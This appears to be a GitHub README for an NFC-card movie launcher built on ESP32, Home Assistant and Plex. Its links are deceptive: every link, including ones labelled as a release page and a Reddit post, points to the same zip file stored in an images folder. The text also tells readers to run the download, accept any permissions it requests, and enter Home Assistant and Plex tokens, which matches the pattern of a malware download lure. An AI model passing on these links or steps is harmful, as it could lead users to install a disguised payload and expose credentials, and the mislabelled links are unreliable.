# 🎥 nfc-movie-library - Easy Movie Start with NFC Cards

[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip)

---

## 📖 What is nfc-movie-library?

This app lets kids start their favorite movies or TV shows by tapping an NFC card. It uses an NFC tag reader connected to a small device (ESP32), Home Assistant software, and the Plex media server. When a card is tapped, the right movie or show starts playing automatically on Apple TV or another Plex player.  

You do not need to press buttons or search through menus. The system runs quietly in the background. Kids can use it on their own.

---

## ⚙️ How the system works

The process works step-by-step:

1. The NFC card is scanned by the ESP32 device.
2. The device sends the card’s unique ID to Home Assistant.
3. Home Assistant triggers an automation based on that ID.
4. This automation calls the Plex API (a way to command Plex).
5. Plex starts playing the chosen movie or show on Apple TV or another player.

This simple flow lets kids start playback without needing a remote or app.

---

## 🖥️ System requirements

- A Windows PC for the initial setup.
- ESP32 microcontroller with an NFC reader (PN532).
- Home Assistant installed (usually on a Raspberry Pi or a server).
- Plex Media Server with your movies or TV shows organized.
- Apple TV or Plex player to watch the movies.
- NFC cards or tags to assign to movies.

This guide focuses on installing and running the Windows application part of the project.

---

## 🚀 Getting started: Download and install the app on Windows

You need to get the Windows version of the software that talks to your ESP32 and Home Assistant. Follow these steps:

### Step 1: Visit the download page

Click this big button to open the release page on GitHub. It holds the latest Windows installer and files needed.

[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip)

### Step 2: Download the Windows setup file

On the release page, look for a file with a name similar to:

`nfc-movie-library-setup.exe` or `nfc-movie-library-windows.zip`

Click the file name to download it. Save it to a folder you can find easily, like your Desktop or Downloads.

### Step 3: Run the installer (if applicable)

If you downloaded a `.exe` file:

- Double-click the file.
- Follow the simple install prompts.
- Accept any permissions it asks for.
- Choose the folder where you want the app installed or keep the default.

If you downloaded a `.zip` file:

- Right-click the zip and select "Extract All".
- Choose where to extract the files.
- Open the extracted folder.

### Step 4: Launch the app

- Find the app icon on your Desktop or in the install folder.
- Double-click to open it.

The app will open a window where you configure your NFC reader and connect it to Home Assistant.

---

## 🔧 Setup inside the app

When you first start the app, you need to connect it to your systems.

### Connect to ESP32 NFC Reader

- Make sure your ESP32 is powered on and connected to your Windows PC via USB (or network, depending on setup).
- The app will detect the device or ask you to choose a COM port.
- Select the port and click "Connect".

### Connect to Home Assistant

- Enter your Home Assistant IP address and access token.
- The app tests the connection.
- Once connected, it listens for NFC tag scans.

### Link Plex Player

- You may need to give the app permission to control your Plex media players.
- This usually involves entering your Plex token or credentials.
- The app uses this to tell Plex what to play.

---

## 🗂️ Organizing your NFC cards

Each NFC card has a unique ID. You assign a movie or TV show to that ID in Home Assistant via automation. This part is outside the Windows app but important.

- Use the Windows app to read tag IDs quickly.
- Copy the tag ID and use Home Assistant’s interface to link the ID to a Plex playback action.

---

## ⚠️ Requirements and tips

- Make sure your Windows PC has a USB port or network access if your ESP32 connects via Wi-Fi.
- You need Home Assistant set up and running with proper automation rules.
- Plex server must have authorized devices.
- NFC cards or stickers can be bought online in packs compatible with PN532 readers.
- Keep a list of which card is assigned to each movie for easy reprogramming.

---

## 👷 Troubleshooting

- If the app does not detect your ESP32 device, check cables and drivers.
- Restart the app or the device if the connection drops.
- Make sure Home Assistant is running and accessible on the IP you entered.
- Check Plex API tokens if playback commands fail.
- Verify that the NFC tag reads correctly in the app before assigning actions.

---

## 📂 More resources

Refer to the original inspiration and details:

- Original Reddit post: https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip
- Project images and code: https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip

---

[![Download Latest Release](https://img.shields.io/badge/Download-nfc--movie--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toopbi7829/nfc-movie-library/main/images/movie-nfc-library-v3.0.zip)